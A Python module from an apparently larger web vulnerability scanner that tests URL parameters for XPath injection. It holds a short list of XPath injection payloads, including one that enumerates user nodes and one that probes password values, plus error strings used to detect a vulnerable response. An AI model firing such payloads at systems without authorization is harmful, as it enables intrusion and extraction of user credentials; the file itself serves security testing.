
from core.scan.module import *


class XPath(GeneralScanner):

    def __init__(self, config) -> None:
        GeneralScanner.__init__(self, config)

    def check(self):
        # check if url has parameters
        # we cannot scan XPath without parameters
        # put all prameters to vulnerable_params for scan it with payloads
        
        self.vulnerable_params = self.request.GetParams()
        return bool(self.vulnerable_params)

    def GetPayloads(self):
        return [
            "AND '1", "AND('", 
            "search=')] | //user/*[contains(*,'", 
            "search=Har') and contains(../password,'c"
        ]

    def is_vulnerable(self, res):
        expected_errors = [
            "SimpleXMLElement::xpath():", "Invalid expression", "evaluation failed",
            "xmlXPathEval:", "SimpleXMLElement", "xpath", "DOMXPath::query()", "Invalid predicate",
            "Warning: DOMXPath", "Warning: SimpleXMLElement", "Invalid expression"
        ]

        for err in expected_errors:
            if err.lower() in res.text.lower():
                return True

        return False